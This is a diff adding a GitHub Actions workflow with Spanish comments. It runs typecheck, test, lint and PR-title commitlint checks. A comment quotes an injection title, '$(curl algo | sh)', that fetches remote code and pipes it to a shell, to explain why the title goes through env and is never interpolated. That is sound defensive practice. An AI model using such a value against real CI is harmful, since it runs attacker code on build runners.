@@ -1,0 +1,102 @@
+# Red de seguridad de cada PR. Los hooks de husky validan en la máquina de quien
+# desarrolla y se saltan con --no-verify; esto no.
+#
+# Cuatro jobs independientes a propósito: el nombre de cada uno es el nombre del check
+# que el issue #6 marcará como obligatorio, y separarlos hace que el PR diga QUÉ falló
+# sin abrir los logs.
+name: PR gates
+
+on:
+  pull_request:
+    # `edited` es imprescindible, no un extra: los tipos por defecto son opened,
+    # synchronize y reopened, así que sin él un PR podía pasar el check con un título
+    # válido, cambiarlo después a cualquier cosa —el rerun nunca se dispara— y entrar a
+    # `main` por squash con ese texto como mensaje de commit. Verificado en el PR #38.
+    #
+    # Coste: cualquier edición de título o cuerpo vuelve a correr los cuatro jobs. Con
+    # `npm ci` en ~1.3 s es despreciable; si dejara de serlo, la salida es separar
+    # `commit-convention` a su propio workflow con su propio disparo.
+    types: [opened, synchronize, reopened, edited]
+  push:
+    branches: [main]
+
+# Ningún job escribe nada.
+permissions:
+  contents: read
+
+# Empujar tres veces seguidas a un PR no debe dejar tres ejecuciones compitiendo.
+# En `main` no se cancela: cada commit integrado merece su propio resultado.
+concurrency:
+  group: ${{ github.workflow }}-${{ github.event.pull_request.number || github.ref }}
+  cancel-in-progress: ${{ github.event_name == 'pull_request' }}
+
+jobs:
+  typecheck:
+    name: typecheck
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - uses: actions/checkout@v7
+      - uses: actions/setup-node@v7
+        with:
+          # Fijada a propósito en vez de leerla de package.json: `engines.node` es un
+          # rango (>=24) y se resolvería a la última disponible, cambiando la versión
+          # del CI sin que nadie lo decida. Mantener en sincronía con `engines.node`.
+          node-version: '24'
+          cache: npm
+      - run: npm ci
+      - run: npm run typecheck
+
+  test:
+    name: test
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - uses: actions/checkout@v7
+      - uses: actions/setup-node@v7
+        with:
+          node-version: '24'
+          cache: npm
+      - run: npm ci
+      - run: npm test
+
+  lint:
+    name: lint
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - uses: actions/checkout@v7
+      - uses: actions/setup-node@v7
+        with:
+          node-version: '24'
+          cache: npm
+      - run: npm ci
+      - name: oxlint
+        run: npm run lint
+      - name: Prettier
+        run: npm run format:check
+
+  commit-convention:
+    name: commit-convention
+    # Solo en PR: en un push a `main` no hay título que validar.
+    if: github.event_name == 'pull_request'
+    runs-on: ubuntu-latest
+    timeout-minutes: 5
+    steps:
+      - uses: actions/checkout@v7
+      - uses: actions/setup-node@v7
+        with:
+          node-version: '24'
+          cache: npm
+      - run: npm ci
+      # El repositorio solo acepta squash con `squash_merge_commit_title = PR_TITLE`:
+      # este título ES el mensaje de commit que queda en `main`.
+      #
+      # El título lo escribe quien abre el PR — en un repo público, cualquiera. Va por
+      # `env` y NUNCA interpolado con ${{ }} dentro del `run`: la interpolación sustituye
+      # texto antes de que exista el shell, así que un título como $(curl algo | sh) se
+      # ejecutaría en el runner.
+      - name: Validar el título del PR
+        env:
+          PR_TITLE: ${{ github.event.pull_request.title }}
+        run: echo "$PR_TITLE" | npx --no-install commitlint
